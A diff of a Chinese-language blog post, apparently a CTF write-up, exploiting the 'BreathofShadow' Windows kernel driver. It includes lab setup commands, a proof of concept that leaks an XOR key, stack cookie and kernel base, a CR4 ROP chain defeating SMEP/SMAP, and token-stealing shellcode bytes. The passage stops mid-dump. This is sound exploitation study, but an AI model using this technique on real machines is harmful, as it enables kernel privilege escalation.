+    如果開啟KVAS的話，應用程式會有兩個CR3，分別指向 ```PCB.DirectoryTableBase``` 和 ```PCB.UserDirectoryTableBase``` 兩個 PML4 表基底位址。其中 DirectoryTableBase 為核心 PML4 的基底。而使用者模式的Cr3（UserDirectoryTableBase）只映射了核心 KVASCODE 區段的物理頁（少數ring 3進入ring 0的入口），而沒有映射其他區段的，因此透過3環的Cr3來尋找核心 TEXT section 的分頁表，**最多只能找到 PPE，從 PDE 開始就沒有被映射了**。
 
 * ### KASLR (Kernel Address Space Layout Randomization)
-KASLR 透過隨機變化每次核心模式程序模組載入的基底位址，防止攻擊者透過已知的記憶體位址發起攻擊。這一概念與 ASLR（地址空間佈局隨機化）類似。
+    KASLR 透過隨機變化每次核心模式程序模組載入的基底位址，防止攻擊者透過已知的記憶體位址發起攻擊。這一概念與 ASLR（地址空間佈局隨機化）類似。
 
 ## IV.2 關掉核心保護!!!
 * ### SMAP、SMEP
@@ -974,29 +976,29 @@ KASLR 透過隨機變化每次核心模式程序模組載入的基底位址，�
 
 * ### 啟用測試簽署驅動程式
  
-首先，在 Windows VM 以管理員身分執行 CMD，並輸入 ```bcdedit /set testsigning on```
-
-![ref11](https://lompandi.github.io/posts/post3/imgs/opents.png)
-
-不這樣做的話它會禁止所有沒有簽章的 Kernel Driver 運行。
+    首先，在 Windows VM 以管理員身分執行 CMD，並輸入 ```bcdedit /set testsigning on```
+    
+    ![ref11](https://lompandi.github.io/posts/post3/imgs/opents.png)
+    
+    不這樣做的話它會禁止所有沒有簽章的 Kernel Driver 運行。
 
 (註: 如果 Secure Boot 有開的話，記得關掉，否則無法啟用測試簽署驅動程式)
 
 * ### 註冊驅動程式
 
-在剛剛的 CMD 中輸入 ```sc create BreathofShadow type=kernel binPath=<BreathofShadow.sys 的檔案路徑> start=auto```
+    在剛剛的 CMD 中輸入 ```sc create BreathofShadow type=kernel binPath=<BreathofShadow.sys 的檔案路徑> start=auto```
 
-![ref12](https://lompandi.github.io/posts/post3/imgs/sc.png)
+    ![ref12](https://lompandi.github.io/posts/post3/imgs/sc.png)
 
-```start=auto``` 是讓它每次開機自動啟動，如果想手動啟動的話，就不需指定該參數。
+    ```start=auto``` 是讓它每次開機自動啟動，如果想手動啟動的話，就不需指定該參數。
 
 * ### 啟動驅動程式
 
-在剛剛的 CMD 中輸入 ```sc start BreathofShadow```
+    在剛剛的 CMD 中輸入 ```sc start BreathofShadow```
 
-![ref13](https://lompandi.github.io/posts/post3/imgs/sdr.png)
+    ![ref13](https://lompandi.github.io/posts/post3/imgs/sdr.png)
 
-現在 Kernel Driver 已經成功運行了。
+    現在 Kernel Driver 已經成功運行了。
 
 ### 2. 開始遠端偵錯
 在實體機上，把 kd 連接上 VM，然後按 ```Ctrl-C``` 中斷執行。
@@ -1131,13 +1133,14 @@ NTSTATUS sub_140006000(PDRIVER_OBJECT pDriverObject)
 
 接下來它使用 [IoCreateSymbolicLink](https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatesymboliclink) 來建立與裝置使用者之間的符號連結。
 
-這裡要來說一下甚麼是 Symbolic Link。一開始在 IoCreateDevice 時傳入的 DeviceName "\\\\Device\\\\BreathofShadow" 只能在核心模式中使用，若要在**使用者模式中訪問驅動裝置就需要 Symbolic Link 來做連結**。
+* ### Symbolic Link
+    這裡要來說一下甚麼是 Symbolic Link。一開始在 IoCreateDevice 時傳入的 DeviceName "\\\\Device\\\\BreathofShadow" 只能在核心模式中使用，若要在**使用者模式中訪問驅動裝置就需要 Symbolic Link 來做連結**。
+    
+    例如，C 硬碟的符號連結名稱是 ``C:``，對應的設備名稱是 ```\Device\HarddiskVolume1```。在驅動程式中，裝置物件名稱需以 ```L"\\Device\\"``` 開頭，其中 "L" 表示字串使用 Unicode 編碼（wchar_t）。而符號連結名稱則需以 ```L"\\DosDevices\\"``` 或 ```L"\\??\\"``` 開頭。
 
-例如，C 硬碟的符號連結名稱是 ``C:``，對應的設備名稱是 ```\Device\HarddiskVolume1```。在驅動程式中，裝置物件名稱需以 ```L"\\Device\\"``` 開頭，其中 "L" 表示字串使用 Unicode 編碼（wchar_t）。而符號連結名稱則需以 ```L"\\DosDevices\\"``` 或 ```L"\\??\\"``` 開頭。
+接下來，初始函數會生成一個隨機值並將其賦值到一個全域變數。
 
-接下來，函數生成一個隨機值並將其賦值到一個全域變數。
-
-接下來裝置初始化完成，我們來看一下他處理 DeviceIoControl 的函數 ```sub_140005130```
+裝置初始化完成。我們接著看他處理 DeviceIoControl 的函數 ```sub_140005130```
 
 ```c++
 NTSTATUS sub_140005130(__int64 a1, PIRP pIrp)
@@ -1202,283 +1205,291 @@ NTSTATUS EncryptionFunction(PIRP pIrp, PIO_STACK_LOCATION CurrentIoStackLocation
 
 ### 4. Exploitation Start!
 
-我們首先使用 Windows API 寫一個腳本和 BreathofShadow 驅動程序正常溝通  (C++)
-
-```c++
-#define WIN32_LEAN_AND_MEAN
-
-#include <windows.h>
-#include <cstdint>
-#include <cstdio>
-
-constexpr uint32_t IOCTL_ENCRYPT = 0x9C40240B;
-
-int main()
-{
-    HANDLE hDevice = CreateFileW(L"\\\\.\\BreathofShadow", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, NULL);
-   
-    if (hDevice == INVALID_HANDLE_VALUE) {
-        puts("[x] Failed to open driver.\n");
-        return 1;
+* ### 最初測試
+    我們首先使用 Windows API 寫一個腳本和 BreathofShadow 驅動程序正常溝通  (C++)
+    
+    ```c++
+    #define WIN32_LEAN_AND_MEAN
+    
+    #include <windows.h>
+    #include <cstdint>
+    #include <cstdio>
+    
+    constexpr uint32_t IOCTL_ENCRYPT = 0x9C40240B;
+    
+    int main()
+    {
+        HANDLE hDevice = CreateFileW(L"\\\\.\\BreathofShadow", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, NULL);
+       
+        if (hDevice == INVALID_HANDLE_VALUE) {
+            puts("[x] Failed to open driver.\n");
+            return 1;
+        }
+        puts("[*] Successfully opened the driver\n");
+        
+        DWORD outSize{};
+        char original_data[256];
+        
+        memset(original_data, 'A', sizeof(original_data));
+        DeviceIoControl(hDevice, IOCTL_ENCRYPT, original_data, sizeof(original_data), NULL, 256, &outSize, NULL);
     }
-    puts("[*] Successfully opened the driver\n");
+    ```
     
-    DWORD outSize{};
-    char original_data[256];
+    接著，在 kd 中，於 EncryptionFunction 的兩次 memcpy 各設一個中斷點來觀察IOCTL時的緩衝區變化的情況:
+    ```
+    kd> bp BreathofShadow+506F
+    kd> bp BreathofShadow+50BA
+    ```
+    然後編譯並運行腳本。
     
-    memset(original_data, 'A', sizeof(original_data));
-    DeviceIoControl(hDevice, IOCTL_ENCRYPT, original_data, sizeof(original_data), NULL, 256, &outSize, NULL);
-}
-```
-
-接著，在 kd 中，於 EncryptionFunction 的兩次 memcpy 各設一個中斷點來觀察IOCTL時的緩衝區變化的情況:
-```
-kd> bp BreathofShadow+506F
-kd> bp BreathofShadow+50BA
-```
-然後編譯並運行腳本。
-
-操作示範:
-
-<video width="640" height="360" controls>
-  <source src="https://lompandi.github.io/posts/post3/vids/save.mp4" type="video/mp4">
-  Your browser does not support the video tag.
-</video>
-
-第一次memcpy前:
-```
-Breakpoint 0 hit
-BreathofShadow+0x506f:
-fffff800`1fad506f e80cc1ffff      call    BreathofShadow+0x1180 (fffff800`1fad1180)
-kd> db rcx L50
-ffff950a`a640d690  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
-ffff950a`a640d6a0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
-ffff950a`a640d6b0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
-ffff950a`a640d6c0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
-ffff950a`a640d6d0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
-kd> db rdx L50
-00000090`c2b9f630  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
-00000090`c2b9f640  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
-00000090`c2b9f650  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
-00000090`c2b9f660  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
-00000090`c2b9f670  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
-kd> r r8
-r8=0000000000000100
-kd> g
-```
-可以看到 RDX 指向的資料 (使用者傳入的 Buffer) 中有我們設定的 A 字元，而 RCX 指向的資料 (核心中的 Buffer) 則是清空的狀態，並且 R8 是我們透過 DeviceIoControl 傳入的 InputSize 256。
-
-第二次memcpy前:
-```
-Breakpoint 1 hit
-BreathofShadow+0x50ba:
-fffff800`1fad50ba e8c1c0ffff      call    BreathofShadow+0x1180 (fffff800`1fad1180)
-kd> db rcx L50
-00000090`c2b9f630  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
-00000090`c2b9f640  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
-00000090`c2b9f650  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
-00000090`c2b9f660  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
-00000090`c2b9f670  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
-kd> db rdx L50
-ffff950a`a640d690  c6 4e 90 37 ad 5d c0 63-c6 4e 90 37 ad 5d c0 63  .N.7.].c.N.7.].c
-ffff950a`a640d6a0  c6 4e 90 37 ad 5d c0 63-c6 4e 90 37 ad 5d c0 63  .N.7.].c.N.7.].c
-ffff950a`a640d6b0  c6 4e 90 37 ad 5d c0 63-c6 4e 90 37 ad 5d c0 63  .N.7.].c.N.7.].c
-ffff950a`a640d6c0  c6 4e 90 37 ad 5d c0 63-c6 4e 90 37 ad 5d c0 63  .N.7.].c.N.7.].c
-ffff950a`a640d6d0  c6 4e 90 37 ad 5d c0 63-c6 4e 90 37 ad 5d c0 63  .N.7.].c.N.7.].c
-kd> r r8
-r8=0000000000000100
-kd> g
-```
-RDX 指向的資料 (核心中的 Buffer) 中有 XOR 後的資料，這將會被拷貝到使用者傳入的 Buffer中，而 R8 是我們透過 DeviceIoControl 傳入的 OutputSize 256。
-
-理解它的套路以後就可以來寫 POC 了，首先我們來抓 XOR Key，可以先傳入一個值，再將 XOR 回傳的結果與原值做 XOR，這樣就能得到 XOR Key: 
-
-```c++
-uintptr_t xor_key = 0x4141414141414141;
-DeviceIoControl(hDevice, IOCTL_ENCRYPT, &xor_key, 8, NULL, 8, &outSize, NULL);
-xor_key ^= 0x4141414141414141;
-printf("Encryption key: 0x%llx\n");
-```
-
-```
-Encryption key: 0x22811cec`76d10f87
-```
-確認一下:
-```
-kd> dq BreathofShadow+3018 L1
-fffff800`1fad3018  22811cec`76d10f87
-```
-
-接下來，我們要看一下我們的資料寫入核心前後時的堆疊布局，再進行 ROP。
-* **複製前**
-
-```
-Breakpoint 0 hit
-BreathofShadow+0x506f:
-fffff800`1fad506f e80cc1ffff      call    BreathofShadow+0x1180 (fffff800`1fad1180)
-kd> dq rcx L35
-ffff950a`a6efb690  00000000`00000000 00000000`00000000
-ffff950a`a6efb6a0  00000000`00000000 00000000`00000000
-[...]
-ffff950a`a6efb780  00000000`00000000 00000000`00000000
-ffff950a`a6efb790  ffff273d`af577f8d fffff800`0961a301
-ffff950a`a6efb7a0  00000000`00000000 00000000`00000001
-ffff950a`a6efb7b0  00000000`c00000bb fffff800`1fad518a
-ffff950a`a6efb7c0  ffff9681`e12fa950 ffff9681`e12fa950
-ffff950a`a6efb7d0  ffff9681`e12faa20 ffff9681`dad0da70
-ffff950a`a6efb7e0  ffff9681`e12fa950 fffff800`08e35cf5
-ffff950a`a6efb7f0  00000000`00000002 00000000`00000000
-ffff950a`a6efb800  ffff950a`a6efbb80 00000000`00000100
-ffff950a`a6efb810  00000000`00000000 00000000`00000001
-ffff950a`a6efb820  ffff9681`e12fa950 fffff800`092452ac
-ffff950a`a6efb830  00000000`00000001
-```
-* **複製後**
-```
-kd> p
-BreathofShadow+0x5074:
-fffff800`1fad5074 8bcb            mov     ecx,ebx
-kd> dq rcx L35
-ffff950a`a6efb690  41414141`41414141 41414141`41414141
-ffff950a`a6efb6a0  41414141`41414141 41414141`41414141
-[...]
-ffff950a`a6efb780  41414141`41414141 41414141`41414141
-ffff950a`a6efb790  ffff273d`af577f8d fffff800`0961a301
-ffff950a`a6efb7a0  00000000`00000000 00000000`00000001
-ffff950a`a6efb7b0  00000000`c00000bb fffff800`1fad518a
-ffff950a`a6efb7c0  ffff9681`e12fa950 ffff9681`e12fa950
-ffff950a`a6efb7d0  ffff9681`e12faa20 ffff9681`dad0da70
-ffff950a`a6efb7e0  ffff9681`e12fa950 fffff800`08e35cf5
-ffff950a`a6efb7f0  00000000`00000002 00000000`00000000
-ffff950a`a6efb800  ffff950a`a6efbb80 00000000`00000100
-ffff950a`a6efb810  00000000`00000000 00000000`00000001
-ffff950a`a6efb820  ffff9681`e12fa950 fffff800`092452ac
-ffff950a`a6efb830  00000000`00000001
-```
-使用```k``` 來查看 backtrace，並尋找 return address 在哪裡。
-```
-kd> k
-Child-SP          RetAddr           Call Site
-ffff950a`a6efb660 fffff800`1fad518a BreathofShadow+0x5074
-ffff950a`a6efb7c0 fffff800`08e35cf5 BreathofShadow+0x518a
-ffff950a`a6efb7f0 fffff800`092452ac nt!IofCallDriver+0x55
-[...]
-kd> s -q ffff950a`a6efb690 L100 BreathofShadow+0x518a
-ffff950a`a6efb7b8  fffff800`1fad518a ffff9681`e12fa950
-```
-
-所以，return address 就在 0xffff950a\`a6efb7b8，計算一下相對於 InputBuffer 的偏移量 0xffff950a\`a6efb7b8 -  ffff950a\`a6efb690 = 0x128 = 296。所以，如果我們傳入296個 bytes 的資料再加上一段位址，函式回傳時就會嘗試執行那段位址的資料。但是，這裡的堆疊有 stack cookie，這是一個隨機值。函數執行結束時，程式會檢查堆疊中的 stack cookie 值是否改變。如果 stack cookie 被改動（通常是因為緩衝區溢位篡改了它），程式會發現這一點並停止執行，避免繼續執行被破壞的程式碼，這代表我們必須要洩漏這個值才有可能做 ROP。
-
-要洩漏 stack cookie 也很簡單，我們只需要把 InputSize 調很小然後 OutputSize 調很大，它就會讀到 Buffer 以外的資料了，為了方便，我們先把 Buffer 後面的值全部讀一讀，然後寫入 ROP 時把除了 return address 的值回復就可以了接下來的步驟就和一般 ROP 一樣了:
-
-```
-char stack_dump[560];
-DeviceIoControl(hDevice, IOCTL_ENCRYPT, stack_dump, 1, NULL, 560, &outSize, NULL);
-hexdump(stack_dump+256, 48);
-
-//把它轉換成 qword 方便以後使用
-uintptr_t* stack_ptrs = (uintptr_t*)stack_dump;
-```
-
-接下來要關掉 SMEP 和 SMAP。要找這兩個 ROP Gadget:
-```
-pop rcx; ret
-mov cr4, rcx; ret
-```
-我們可以到 ntoskrnl.exe (``C:\Windows\System32\ntoskrnl.exe``) 中找，因為很多 Kernel Driver 的堆疊上都有指向 ntoskrnl.exe 資料的指標，我們的也不例外:
-
-```
-kd> p
-BreathofShadow+0x5074:
-fffff800`1fad5074 8bcb            mov     ecx,ebx
-kd> dq rcx L35
-ffff950a`a6efb690  41414141`41414141 41414141`41414141
-ffff950a`a6efb6a0  41414141`41414141 41414141`41414141
-[...]
-ffff950a`a6efb780  41414141`41414141 41414141`41414141
-ffff950a`a6efb790  ffff273d`af577f8d fffff800`0961a301
-ffff950a`a6efb7a0  00000000`00000000 00000000`00000001
-ffff950a`a6efb7b0  00000000`c00000bb fffff800`1fad518a
-ffff950a`a6efb7c0  ffff9681`e12fa950 ffff9681`e12fa950
-ffff950a`a6efb7d0  ffff9681`e12faa20 ffff9681`dad0da70
-ffff950a`a6efb7e0  ffff9681`e12fa950 fffff800`08e35cf5
-ffff950a`a6efb7f0  00000000`00000002 00000000`00000000
-ffff950a`a6efb800  ffff950a`a6efbb80 00000000`00000100
-ffff950a`a6efb810  00000000`00000000 00000000`00000001
-ffff950a`a6efb820  ffff9681`e12fa950 fffff800`092452ac
-ffff950a`a6efb830  00000000`00000001
-
-kd> lm m nt
-start             end                 module name
-fffff800`08c00000 fffff800`09c46000   nt         (pdb symbols)          C:\ProgramData\dbg\sym\ntkrnlmp.pdb\D9424FC4861E47C10FAD1B35DEC6DCC81\ntkrnlmp.pdb
-```
-
-在 ffff950a\`a6efb790 上，有一個指標 fffff800\`0961a301 在 ntoskrnl (nt) 的記憶體範圍內，並且指向 ntoskrnl.exe + 0xA1A301 (偏移值不同版本的機器可能會不太一樣) 所以我們只需要從 stack_dump 中抓這個指標然後扣掉 0xA1A301 就可以得到 ```ntoskrnl.exe``` 的基底，也就是 kernel base 了。
-
-```c++
-uintptr_t kernel_base = stack_ptrs[33] - 0xA1A301;
-printf("Nt module base at 0x%llx\n", kernel_base);
-```
-
-最後是兩個 ROP Gadget 的偏移 :
-
-pop rcx; ret -> ntoskrnl.exe + 0x2148c8
-
-mov cr4, rcx -> ntoskrnl.exe + 0x3A0A87
-
-開始寫 payload 前，記得傳入的位址資料要先與 XOR Key 做 XOR，否則原本的值會被改變:
-```c++
-#define ADDR(x) ((x) ^ xor_key)
-```
-建構 Payload:
-```c++
-uintptr_t payload[74] {};
-for(int i = 36; i >= 31; i--){
-    payload[i] = ADDR(stack_ptrs[i]);
-}
-
-payload[37] = ADDR(kernel_base + 0x2148c8); //pop rcx, ret
-payload[38] = ADDR(0x50ef0);
-payload[39] = ADDR(kernel_base + 0x3A0A87); //mov cr4, rcx; ret
-```
-然後把之前得那支提權 shellcode 組譯，這裡推薦 [defuse.ca](https://defuse.ca/online-x86-assembler.htm#disassembly) ，它有支援 C 字串格式的組譯輸出，很方便。
-然後把組譯結果放到 POC 中，並且把第 54 和 55 個位元組換成目前的程序的 PID (使用 GetCurrentProcessId)
-```c++
-char shellcode[] = "\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x48\x8B\x92\xB8\x00\x00\x00\x4c\x8B\x8a\x48\x04\x00\x00\x49\x8B\x09\x48\x8B\x51\xF8\x48\x83\xFA\x04\x74\x05\x48\x8B\x09\xEB\xF1\x48\x8B\x41\x70\x24\xF0\x48\x8B\x51\xF8\x48\x81\xFA\x00\x00\x00\x00\x74\x05\x48\x8B\x09\xEB\xEE\x48\x89\x41\x70\xC3";
-
-DWORD pid = GetCurrentProcessId();
-
-shellcode[54] = (char)pid;
-shellcode[55] = (char)(pid >> 8);
-```
-接下來用 VirtualAlloc 來分配一塊擁有 RWE 權限的記憶體，最後把 VirtuAlloc 回傳的位址放到 ROP Chain 裡，然後 IOCTL 完後再啟動一個 CMD 就大功告成啦! (原題解中只有 ```VirtualAlloc``` RW，然後手動用 ASM 秀一波 PML4E 定址然後手動改 XD 位元，我其實不太懂為甚麼要這樣 <span style="font-size: 30px;">🤨</span>)
-```c++
-void start_process(){
-    puts("Exploit done, waiting for command prompt...\n");
-    system("cmd.exe");
-}
-```
-```c++
-PVOID shellcode_addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-memcpy(shellcode_addr, shellcode, sizeof(shellcode));
-
-printf("Shellcode at 0x%llx\n", (uintptr_t)shellcode);
-payload[40] = ADDR((uintptr_t)shellcode_addr);
-
-DeviceIoControl(device, IOCTL_ENCRYPT, &payload, sizeof(payload), NULL, sizeof(payload), &outSize, NULL); //Send our payload!
-
-```
-
-做完POC後，我<span style="text-decoration: line-through; text-decoration-thickness: 3px;">~~性~~致勃勃的</span>執行，結果...
-<figure>
+    操作示範:
+    
     <video width="640" height="360" controls>
-      <source src="https://lompandi.github.io/posts/post3/vids/failed.mp4" type="video/mp4">
+      <source src="https://lompandi.github.io/posts/post3/vids/save.mp4" type="video/mp4">
       Your browser does not support the video tag.
     </video>
-    <figcaption>看好了觀眾們! 我只會示範一次...</figcaption>
-</figure>
+    
+    第一次memcpy前:
+    ```
+    Breakpoint 0 hit
+    BreathofShadow+0x506f:
+    fffff800`1fad506f e80cc1ffff      call    BreathofShadow+0x1180 (fffff800`1fad1180)
+    kd> db rcx L50
+    ffff950a`a640d690  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+    ffff950a`a640d6a0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+    ffff950a`a640d6b0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+    ffff950a`a640d6c0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+    ffff950a`a640d6d0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+    kd> db rdx L50
+    00000090`c2b9f630  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+    00000090`c2b9f640  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+    00000090`c2b9f650  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+    00000090`c2b9f660  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+    00000090`c2b9f670  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+    kd> r r8
+    r8=0000000000000100
+    kd> g
+    ```
+    可以看到 RDX 指向的資料 (使用者傳入的 Buffer) 中有我們設定的 A 字元，而 RCX 指向的資料 (核心中的 Buffer) 則是清空的狀態，並且 R8 是我們透過 DeviceIoControl 傳入的 InputSize 256。
+    
+    第二次memcpy前:
+    ```
+    Breakpoint 1 hit
+    BreathofShadow+0x50ba:
+    fffff800`1fad50ba e8c1c0ffff      call    BreathofShadow+0x1180 (fffff800`1fad1180)
+    kd> db rcx L50
+    00000090`c2b9f630  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+    00000090`c2b9f640  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+    00000090`c2b9f650  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+    00000090`c2b9f660  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+    00000090`c2b9f670  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+    kd> db rdx L50
+    ffff950a`a640d690  c6 4e 90 37 ad 5d c0 63-c6 4e 90 37 ad 5d c0 63  .N.7.].c.N.7.].c
+    ffff950a`a640d6a0  c6 4e 90 37 ad 5d c0 63-c6 4e 90 37 ad 5d c0 63  .N.7.].c.N.7.].c
+    ffff950a`a640d6b0  c6 4e 90 37 ad 5d c0 63-c6 4e 90 37 ad 5d c0 63  .N.7.].c.N.7.].c
+    ffff950a`a640d6c0  c6 4e 90 37 ad 5d c0 63-c6 4e 90 37 ad 5d c0 63  .N.7.].c.N.7.].c
+    ffff950a`a640d6d0  c6 4e 90 37 ad 5d c0 63-c6 4e 90 37 ad 5d c0 63  .N.7.].c.N.7.].c
+    kd> r r8
+    r8=0000000000000100
+    kd> g
+    ```
+    RDX 指向的資料 (核心中的 Buffer) 中有 XOR 後的資料，這將會被拷貝到使用者傳入的 Buffer中，而 R8 是我們透過 DeviceIoControl 傳入的 OutputSize 256。
 
-為甚麼啊😭? 後來我發現我沒恢復堆疊框架導至它執行完 shellcode 後就不知道要幹嘛了，而恢復 stack frame 又很麻煩(我很懶) 正當我一籌莫展時，我看到了古人留下來的題解...
+
+* ### 洩漏 XOR Key
+    理解它的套路以後就可以來寫 POC 了，首先我們來抓 XOR Key，可以先傳入一個值，再將 XOR 回傳的結果與原值做 XOR，這樣就能得到 XOR Key: 
+    
+    ```c++
+    uintptr_t xor_key = 0x4141414141414141;
+    DeviceIoControl(hDevice, IOCTL_ENCRYPT, &xor_key, 8, NULL, 8, &outSize, NULL);
+    xor_key ^= 0x4141414141414141;
+    printf("Encryption key: 0x%llx\n");
+    ```
+    
+    ```
+    Encryption key: 0x22811cec`76d10f87
+    ```
+    確認一下:
+    ```
+    kd> dq BreathofShadow+3018 L1
+    fffff800`1fad3018  22811cec`76d10f87
+    ```
+
+* ### 準備 (KROP)
+    接下來，我們要看一下我們的資料寫入核心前後時的堆疊布局，再進行 ROP。
+    * **複製前**
+    
+    ```
+    Breakpoint 0 hit
+    BreathofShadow+0x506f:
+    fffff800`1fad506f e80cc1ffff      call    BreathofShadow+0x1180 (fffff800`1fad1180)
+    kd> dq rcx L35
+    ffff950a`a6efb690  00000000`00000000 00000000`00000000
+    ffff950a`a6efb6a0  00000000`00000000 00000000`00000000
+    [...]
+    ffff950a`a6efb780  00000000`00000000 00000000`00000000
+    ffff950a`a6efb790  ffff273d`af577f8d fffff800`0961a301
+    ffff950a`a6efb7a0  00000000`00000000 00000000`00000001
+    ffff950a`a6efb7b0  00000000`c00000bb fffff800`1fad518a
+    ffff950a`a6efb7c0  ffff9681`e12fa950 ffff9681`e12fa950
+    ffff950a`a6efb7d0  ffff9681`e12faa20 ffff9681`dad0da70
+    ffff950a`a6efb7e0  ffff9681`e12fa950 fffff800`08e35cf5
+    ffff950a`a6efb7f0  00000000`00000002 00000000`00000000
+    ffff950a`a6efb800  ffff950a`a6efbb80 00000000`00000100
+    ffff950a`a6efb810  00000000`00000000 00000000`00000001
+    ffff950a`a6efb820  ffff9681`e12fa950 fffff800`092452ac
+    ffff950a`a6efb830  00000000`00000001
+    ```
+    * **複製後**
+    ```
+    kd> p
+    BreathofShadow+0x5074:
+    fffff800`1fad5074 8bcb            mov     ecx,ebx
+    kd> dq rcx L35
+    ffff950a`a6efb690  41414141`41414141 41414141`41414141
+    ffff950a`a6efb6a0  41414141`41414141 41414141`41414141
+    [...]
+    ffff950a`a6efb780  41414141`41414141 41414141`41414141
+    ffff950a`a6efb790  ffff273d`af577f8d fffff800`0961a301
+    ffff950a`a6efb7a0  00000000`00000000 00000000`00000001
+    ffff950a`a6efb7b0  00000000`c00000bb fffff800`1fad518a
+    ffff950a`a6efb7c0  ffff9681`e12fa950 ffff9681`e12fa950
+    ffff950a`a6efb7d0  ffff9681`e12faa20 ffff9681`dad0da70
+    ffff950a`a6efb7e0  ffff9681`e12fa950 fffff800`08e35cf5
+    ffff950a`a6efb7f0  00000000`00000002 00000000`00000000
+    ffff950a`a6efb800  ffff950a`a6efbb80 00000000`00000100
+    ffff950a`a6efb810  00000000`00000000 00000000`00000001
+    ffff950a`a6efb820  ffff9681`e12fa950 fffff800`092452ac
+    ffff950a`a6efb830  00000000`00000001
+    ```
+    使用```k``` 來查看 backtrace，並尋找 return address 在哪裡。
+    ```
+    kd> k
+    Child-SP          RetAddr           Call Site
+    ffff950a`a6efb660 fffff800`1fad518a BreathofShadow+0x5074
+    ffff950a`a6efb7c0 fffff800`08e35cf5 BreathofShadow+0x518a
+    ffff950a`a6efb7f0 fffff800`092452ac nt!IofCallDriver+0x55
+    [...]
+    kd> s -q ffff950a`a6efb690 L100 BreathofShadow+0x518a
+    ffff950a`a6efb7b8  fffff800`1fad518a ffff9681`e12fa950
+    ```
+    
+    所以，return address 就在 0xffff950a\`a6efb7b8，計算一下相對於 InputBuffer 的偏移量 0xffff950a\`a6efb7b8 -  ffff950a\`a6efb690 = 0x128 = 296。所以，如果我們傳入296個 bytes 的資料再加上一段位址，函式回傳時就會嘗試執行那段位址的資料。但是，這裡的堆疊有 stack cookie，這是一個隨機值。函數執行結束時，程式會檢查堆疊中的 stack cookie 值是否改變。如果 stack cookie 被改動（通常是因為緩衝區溢位篡改了它），程式會發現這一點並停止執行，避免繼續執行被破壞的程式碼，這代表我們必須要洩漏這個值才有可能做 ROP。
+
+* ### Bypass Stack Canary via Leaking Stack Cookie
+    要洩漏 stack cookie 也很簡單，我們只需要把 InputSize 調很小然後 OutputSize 調很大，它就會讀到 Buffer 以外的資料了，為了方便，我們先把 Buffer 後面的值全部讀一讀，然後寫入 ROP 時把除了 return address 的值回復就可以了接下來的步驟就和一般 ROP 一樣了:
+    
+    ```
+    char stack_dump[560];
+    DeviceIoControl(hDevice, IOCTL_ENCRYPT, stack_dump, 1, NULL, 560, &outSize, NULL);
+    hexdump(stack_dump+256, 48);
+    
+    //把它轉換成 qword 方便以後使用
+    uintptr_t* stack_ptrs = (uintptr_t*)stack_dump;
+    ```
+
+* ### Bypass SMEP and SMAP
+    接下來要關掉 SMEP 和 SMAP。要找這兩個 ROP Gadget:
+    ```
+    pop rcx; ret
+    mov cr4, rcx; ret
+    ```
+    我們可以到 ntoskrnl.exe (``C:\Windows\System32\ntoskrnl.exe``) 中找，因為很多 Kernel Driver 的堆疊上都有指向 ntoskrnl.exe 資料的指標，我們的也不例外:
+    
+    ```
+    kd> p
+    BreathofShadow+0x5074:
+    fffff800`1fad5074 8bcb            mov     ecx,ebx
+    kd> dq rcx L35
+    ffff950a`a6efb690  41414141`41414141 41414141`41414141
+    ffff950a`a6efb6a0  41414141`41414141 41414141`41414141
+    [...]
+    ffff950a`a6efb780  41414141`41414141 41414141`41414141
+    ffff950a`a6efb790  ffff273d`af577f8d fffff800`0961a301
+    ffff950a`a6efb7a0  00000000`00000000 00000000`00000001
+    ffff950a`a6efb7b0  00000000`c00000bb fffff800`1fad518a
